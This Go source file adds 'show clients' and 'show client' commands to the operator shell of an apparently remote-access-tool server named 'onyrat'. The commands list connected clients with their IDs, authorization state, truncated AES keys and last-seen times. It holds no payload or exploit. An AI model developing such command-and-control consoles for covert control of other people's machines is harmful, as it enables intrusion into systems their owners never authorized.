//go:build server
// +build server

package handlers

import (
	"fmt"
	"time"

	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/abiosoft/ishell"
)

func RegisterShowCommand(s *network.KCPServer, shell *ishell.Shell) {
	showCmd := &ishell.Cmd{
		Name:    "show",
		Aliases: []string{"list"},
		Help:    "display information about clients or data",
		LongHelp: `
Usage: show <thing> [...args]

Examples:
  show clients            # List all clients
  show client 1           # Show details for client ID 1`,
	}

	shell.AddCmd(showCmd)

	showCmd.AddCmd(&ishell.Cmd{
		Name: "clients",
		Help: "list all connected clients",
		LongHelp: `
Usage: show clients

Displays a list of all currently connected clients with their ID, address, and connection time.`,

		Func: func(c *ishell.Context) {
			if len(s.GetClients()) == 0 {
				c.Println("No clients")
				return
			}

			for ip, client := range s.GetClients() {
				// Show summary of clients
				c.Println("---------------")
				c.Printf("Client: %s\n", ip)
				c.Printf("\tID: %d\n", client.ID)
				c.Println("---------------")
			}
		},
	})

	showCmd.AddCmd(&ishell.Cmd{
		Name: "client",
		Help: "show detailed info for a specific client",
		LongHelp: `
Usage: show client <id|address>

Shows detailed information for a specific client, including ID, authorization status, AES key, and last seen time.`,

		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				c.Println("Type `show client help` for more information")
				c.HelpText()
				c.Err(fmt.Errorf("not enough arguments"))
				return
			}

			address := c.Args[0]
			if address == "" {
				c.Println("Usage: show client <id|address>")
				c.Err(fmt.Errorf("invalid address/id"))
				return
			}

			client, err := getClient(s, address)
			if err != nil {
				c.Println("Failed to get client")
				c.Err(err)
				return
			}

			c.Printf("Client: %s\n", address)
			c.Printf("\tID: %d\n", client.ID)
			c.Printf("\tAuthorized: %t\n", client.Authorized)

			preview := client.AESKey
			if len(client.AESKey) >= 4 {
				preview = client.AESKey[:4]
			}

			c.Printf("\tAES Key: %x...\n", preview)
			c.Printf("\tLast Seen: %ds ago\n", int(time.Since(client.LastSeen).Seconds()))
		},
	})
}
